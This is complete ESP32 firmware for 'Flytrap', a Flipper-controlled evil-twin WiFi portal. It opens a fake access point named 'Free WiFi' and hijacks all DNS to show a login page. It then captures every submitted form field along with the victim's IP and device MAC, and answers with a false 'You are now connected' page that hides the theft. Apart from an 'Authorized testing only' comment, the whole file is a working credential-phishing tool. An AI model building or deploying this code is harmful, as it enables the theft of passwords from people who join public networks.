// Flytrap firmware for the ESP32-S2 WiFi dev board.
// Speaks the Flytrap v2 wire protocol with the Flipper app over UART0 (115200).
//
// Flipper -> ESP:
//   sethtml <N>\n  then exactly N raw bytes of HTML (may contain newlines)
//   setap <ssid>\n
//   start\n | stop\n | reset\n
// ESP -> Flipper (line-oriented):
//   STATUS <token>   (boot, html_ok, ap_ok, portal_up ip=..., stopped, resetting)
//   HIT              (a station joined the AP)
//   CRED <urlencoded>   (all submitted form fields, one line per submission)
//
// Authorized testing only.

#include <WiFi.h>
#include <AsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include <DNSServer.h>

#define MAX_HTML_SIZE 24000
#define MAX_SSID 32

static char index_html[MAX_HTML_SIZE + 1] =
    "<html><body><h1>Flytrap</h1><p>Set a portal from the Flipper.</p></body></html>";
static size_t index_html_len = 0;
static char apName[MAX_SSID + 1] = "Free WiFi";

// Served after a credential submission (instead of re-showing the login).
static const char success_html[] =
    "<!doctypehtml><html><head><meta name=viewport "
    "content='width=device-width,initial-scale=1'><title>Connecting</title></head>"
    "<body style='font-family:sans-serif;text-align:center;padding-top:60px'>"
    "<h2>Connecting&hellip;</h2><p>You are now connected to the internet.</p></body></html>";
static const size_t success_html_len = sizeof(success_html) - 1;

static DNSServer dnsServer;
static AsyncWebServer server(80);
static bool portalRunning = false;
static IPAddress apIP(192, 168, 4, 1);

// Protocol lines are emitted from three tasks (loop, WiFi event, async web
// server). Serialize whole lines so they can't interleave and desync the Flipper.
static SemaphoreHandle_t serialMutex = NULL;
static void emitLine(const String& s) {
    if(serialMutex) xSemaphoreTake(serialMutex, portMAX_DELAY);
    Serial.println(s);
    if(serialMutex) xSemaphoreGive(serialMutex);
}

// Serial command / html-stream state
static String lineBuf;
static bool readingHtml = false;
static size_t htmlRemaining = 0;
static size_t htmlPos = 0;

static String urlencode(const String& s) {
    static const char hex[] = "0123456789ABCDEF";
    String out;
    out.reserve(s.length() * 2);
    for(size_t i = 0; i < s.length(); i++) {
        char c = s[i];
        if(isalnum((unsigned char)c) || c == '-' || c == '_' || c == '.' || c == '~') {
            out += c;
        } else {
            out += '%';
            out += hex[(c >> 4) & 0xF];
            out += hex[c & 0xF];
        }
    }
    return out;
}

static void captureParams(AsyncWebServerRequest* request) {
    int n = request->params();
    if(n <= 0) return;
    // Prefix the requester's IP so submissions from different devices are distinct.
    String out = "CRED ip=";
    out += request->client()->remoteIP().toString();
    for(int i = 0; i < n; i++) {
        const AsyncWebParameter* p = request->getParam(i);
        out += "&";
        out += urlencode(p->name());
        out += "=";
        out += urlencode(p->value());
    }
    emitLine(out);
}

class CaptiveHandler : public AsyncWebHandler {
public:
    CaptiveHandler() {}
    virtual ~CaptiveHandler() {}
    bool canHandle(AsyncWebServerRequest* request) const override {
        (void)request;
        return true; // handle every host/path so the captive portal always shows
    }
    void handleRequest(AsyncWebServerRequest* request) override {
        if(request->params() > 0) {
            // A form was submitted: log it and show a believable success page.
            captureParams(request);
            request->send(200, "text/html", (const uint8_t*)success_html, success_html_len);
        } else {
            request->send(200, "text/html", (const uint8_t*)index_html, index_html_len);
        }
    }
};

static void onStaConnect(WiFiEvent_t event, WiFiEventInfo_t info) {
    (void)event;
    const uint8_t* m = info.wifi_ap_staconnected.mac;
    char mac[18];
    snprintf(
        mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X", m[0], m[1], m[2], m[3], m[4], m[5]);
    emitLine(String("HIT mac=") + mac);
}

static void startPortal() {
    WiFi.mode(WIFI_AP);
    WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
    WiFi.softAP(apName);
    delay(100);

    dnsServer.start(53, "*", apIP);
    server.addHandler(new CaptiveHandler()).setFilter(ON_AP_FILTER);
    server.begin();
    portalRunning = true;

    emitLine("STATUS portal_up ip=" + WiFi.softAPIP().toString());
}

static void stopPortal() {
    if(portalRunning) {
        server.end();
        dnsServer.stop();
        WiFi.softAPdisconnect(true);
        portalRunning = false;
    }
    emitLine("STATUS stopped");
}

static void processCommand(String cmd) {
    cmd.trim();
    if(cmd.startsWith("setap ")) {
        String s = cmd.substring(6);
        s.trim();
        strlcpy(apName, s.c_str(), sizeof(apName));
        emitLine("STATUS ap_ok");
    } else if(cmd.startsWith("sethtml ")) {
        long n = cmd.substring(8).toInt();
        if(n < 0) n = 0;
        if((size_t)n > MAX_HTML_SIZE) {
            // Bogus/oversized length — reject instead of wedging the reader.
            emitLine("STATUS html_err");
            return;
        }
        htmlRemaining = (size_t)n;
        htmlPos = 0;
        if(htmlRemaining == 0) {
            index_html[0] = '\0';
            index_html_len = 0;
            emitLine("STATUS html_ok");
        } else {
            readingHtml = true;
        }
    } else if(cmd == "start") {
        startPortal();
    } else if(cmd == "stop") {
        stopPortal();
    } else if(cmd == "reset") {
        emitLine("STATUS resetting");
        delay(50);
        ESP.restart();
    }
}

static void pumpSerial() {
    while(Serial.available()) {
        char c = (char)Serial.read();
        if(readingHtml) {
            if(htmlPos < MAX_HTML_SIZE) index_html[htmlPos] = c;
            htmlPos++;
            htmlRemaining--;
            if(htmlRemaining == 0) {
                size_t stored = (htmlPos < MAX_HTML_SIZE) ? htmlPos : MAX_HTML_SIZE;
                index_html[stored] = '\0';
                index_html_len = stored;
                readingHtml = false;
                emitLine("STATUS html_ok");
            }
        } else if(c == '\n') {
            processCommand(lineBuf);
            lineBuf = "";
        } else if(c != '\r') {
            lineBuf += c;
            if(lineBuf.length() > 200) lineBuf = ""; // runaway guard
        }
    }
}

void setup() {
    serialMutex = xSemaphoreCreateMutex();
    Serial.setRxBufferSize(2048);
    Serial.begin(115200);
    delay(100);
    index_html_len = strlen(index_html);
    WiFi.onEvent(onStaConnect, ARDUINO_EVENT_WIFI_AP_STACONNECTED);
    lineBuf.reserve(210);
    emitLine("STATUS boot");
}

void loop() {
    if(portalRunning) dnsServer.processNextRequest();
    pumpSerial();
}
